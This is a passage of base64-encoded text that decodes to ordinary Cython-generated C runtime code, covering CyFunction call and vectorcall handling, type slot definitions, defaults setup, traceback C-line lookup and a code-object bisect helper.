lY3RvcmNhbGxfQ2FsbChmdW5jLCBhcmdzLCBrdyk7CiNlbmRpZgogICAgfQojZW5kaWYKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBQeV9zc2l6ZV90IGFyZ2M7CiAgICAgICAgUHlPYmplY3QgKm5ld19hcmdzOwogICAgICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBhcmdjID0gUHlUdXBsZV9HRVRfU0laRShhcmdzKTsKI2Vsc2UKICAgICAgICBhcmdjID0gUHlUdXBsZV9TaXplKGFyZ3MpOwogICAgICAgIGlmICh1bmxpa2VseShhcmdjIDwgMCkpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICBuZXdfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgYXJnYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfYXJncykpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIHNlbGYgPSBQeVR1cGxlX0dldEl0ZW0oYXJncywgMCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSkgewogICAgICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAgInVuYm91bmQgbWV0aG9kICUuMjAwUygpIG5lZWRzIGFuIGFyZ3VtZW50IiwKICAgICAgICAgICAgICAgICAgICAgICAgIGN5ZnVuYy0+ZnVuY19xdWFsbmFtZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgbmV3X2FyZ3MsIGt3KTsKICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoZnVuYywgYXJncywga3cpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBpbnQgcmV0ID0gMDsKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkgewogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgICAgICBjeWZ1bmMsICJuZWVkcyBhbiBhcmd1bWVudCIpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIHJldCA9IDE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoa3duYW1lcykgJiYgdW5saWtlbHkoX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIHJldDsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7CiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjsKI2Vsc2UKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTsKI2VuZGlmCiAgICBQeU9iamVjdCAqc2VsZjsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpOwogICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDsKI2VuZGlmCiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywga3duYW1lcykpIHsKICAgIGNhc2UgMToKICAgICAgICBzZWxmID0gYXJnc1swXTsKICAgICAgICBhcmdzICs9IDE7CiAgICAgICAgbmFyZ3MgLT0gMTsKICAgICAgICBicmVhazsKICAgIGNhc2UgMDoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDApKSB7CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcigKICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8gYXJndW1lbnRzIiwgbmFyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuIG1ldGgoc2VsZiwgTlVMTCk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpCnsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYzsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBpZiAodW5saWtlbHkobmFyZ3MgIT0gMSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIG5hcmdzKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiBtZXRoKHNlbGYsIGFyZ3NbMF0pOwp9CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7CiNlbHNlCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7CiNlbmRpZgogICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7CiNlbmRpZgogICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIE5VTEwpKSB7CiAgICBjYXNlIDE6CiAgICAgICAgc2VsZiA9IGFyZ3NbMF07CiAgICAgICAgYXJncyArPSAxOwogICAgICAgIG5hcmdzIC09IDE7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIDA6CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7CiNlbmRpZgogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcyk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwogICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd25hbWVzKTsKfQojZW5kaWYKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0N5RnVuY3Rpb25UeXBlX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2RlYWxsb2N9LAogICAge1B5X3RwX3JlcHIsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9yZXByfSwKICAgIHtQeV90cF9jYWxsLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kfSwKICAgIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlfSwKICAgIHtQeV90cF9jbGVhciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyfSwKICAgIHtQeV90cF9tZXRob2RzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc30sCiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnN9LAogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX2dldHNldHN9LAogICAge1B5X3RwX2Rlc2NyX2dldCwgKHZvaWQgKilfX1B5eF9QeU1ldGhvZF9OZXd9LAogICAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiY3l0aG9uX2Z1bmN0aW9uX29yX21ldGhvZCIsCiAgICBzaXplb2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCksCiAgICAwLAojaWZkZWYgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUgogICAgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUiB8CiNlbmRpZgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIGRlZmluZWQoUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpCiAgICBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8CiNlbGlmIGRlZmluZWQoX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKQogICAgX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHwKI2VuZGlmCiNlbmRpZiAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwKI2VuZGlmCiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0MgfCBQeV9UUEZMQUdTX0JBU0VUWVBFLAogICAgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHMKfTsKc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSkgewogICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTsKICAgIG1zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYygKICAgICAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSwgbW9kdWxlLCAmX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYywgTlVMTCk7CiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9PSBOVUxMKSkgewogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYywgUHlUeXBlT2JqZWN0ICpkZWZhdWx0c190eXBlKSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzID0gUHlPYmplY3RfQ2FsbE9iamVjdCgoUHlPYmplY3QqKWRlZmF1bHRzX3R5cGUsIE5VTEwpOyAvLyBfUHlPYmplY3RfTmV3KGRlZmF1bHRzX3R5cGUpOwogICAgaWYgKHVubGlrZWx5KCFtLT5kZWZhdWx0cykpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gbS0+ZGVmYXVsdHM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7CiAgICBtLT5kZWZhdWx0c190dXBsZSA9IHR1cGxlOwogICAgUHlfSU5DUkVGKHR1cGxlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpkaWN0KSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzX2t3ZGljdCA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwogICAgbS0+ZnVuY19hbm5vdGF0aW9ucyA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fTmV3KFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewogICAgUHlPYmplY3QgKm9wID0gX19QeXhfQ3lGdW5jdGlvbl9Jbml0KAogICAgICAgIFB5T2JqZWN0X0dDX05ldyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSksCiAgICAgICAgbWwsIGZsYWdzLCBxdWFsbmFtZSwgY2xvc3VyZSwgbW9kdWxlLCBnbG9iYWxzLCBjb2RlCiAgICApOwogICAgaWYgKGxpa2VseShvcCkpIHsKICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhvcCk7CiAgICB9CiAgICByZXR1cm4gb3A7Cn0KCgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUUKc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpIHsKICAgIFB5T2JqZWN0ICp1c2VfY2xpbmU7CiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBQeU9iamVjdCAqKmN5dGhvbl9ydW50aW1lX2RpY3Q7CiNlbmRpZgogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodHN0YXRlKTsKICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSB7CiAgICAgICAgcmV0dXJuIGNfbGluZTsKICAgIH0KICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsICZwdHlwZSwgJnB2YWx1ZSwgJnB0cmFjZWJhY2spOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBjeXRob25fcnVudGltZV9kaWN0ID0gX1B5T2JqZWN0X0dldERpY3RQdHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogICAgaWYgKGxpa2VseShjeXRob25fcnVudGltZV9kaWN0KSkgewogICAgICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oKmN5dGhvbl9ydW50aW1lX2RpY3QpOwogICAgICAgIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKAogICAgICAgICAgICB1c2VfY2xpbmUsICpjeXRob25fcnVudGltZV9kaWN0LAogICAgICAgICAgICBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cigqY3l0aG9uX3J1bnRpbWVfZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaykpCiAgICAgICAgUHlfWElOQ1JFRih1c2VfY2xpbmUpOwogICAgICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICB9IGVsc2UKI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICp1c2VfY2xpbmVfb2JqID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2spOwogICAgICBpZiAodXNlX2NsaW5lX29iaikgewogICAgICAgIHVzZV9jbGluZSA9IFB5T2JqZWN0X05vdCh1c2VfY2xpbmVfb2JqKSA/IFB5X0ZhbHNlIDogUHlfVHJ1ZTsKICAgICAgICBQeV9JTkNSRUYodXNlX2NsaW5lKTsKICAgICAgICBQeV9ERUNSRUYodXNlX2NsaW5lX29iaik7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB1c2VfY2xpbmUgPSBOVUxMOwogICAgICB9CiAgICB9CiAgICBpZiAoIXVzZV9jbGluZSkgewogICAgICAgIGNfbGluZSA9IDA7CiAgICAgICAgKHZvaWQpIFB5T2JqZWN0X1NldEF0dHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKTsKICAgIH0KICAgIGVsc2UgaWYgKHVzZV9jbGluZSA9PSBQeV9GYWxzZSB8fCAodXNlX2NsaW5lICE9IFB5X1RydWUgJiYgUHlPYmplY3RfTm90KHVzZV9jbGluZSkgIT0gMCkpIHsKICAgICAgICBjX2xpbmUgPSAwOwogICAgfQogICAgUHlfWERFQ1JFRih1c2VfY2xpbmUpOwogICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTsKICAgIHJldHVybiBjX2xpbmU7Cn0KI2VuZGlmCgoKc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHsKICAgIGludCBzdGFydCA9IDAsIG1pZCA9IDAsIGVuZCA9IGNvdW50IC0gMTsKICAgIGlmIChlbmQgPj0gMCAmJiBjb2RlX2xpbmUgPiBlbnRyaWVzW2VuZF0uY29kZV9saW5lKSB7CiAgICAgICAgcmV0dXJuIGNvdW50OwogICAgfQogICAgd2hpbGUgKHN0YXJ0IDwgZW5kKSB7CiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjsKICAgICAgICBpZiAoY29kZV9saW5lIDwgZW50cmllc1ttaWRdLmNvZGVfbGluZSkgewogICAgICAgICAgICBlbmQgPSBtaWQ7CiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7CiAgICAgICAgICAgICBzdGFydCA9IG1pZCArIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIG1pZDsKICAgICAgICB9CiAgICB9CiAgICBpZiAoY29kZV9saW5lIDw9IGVudH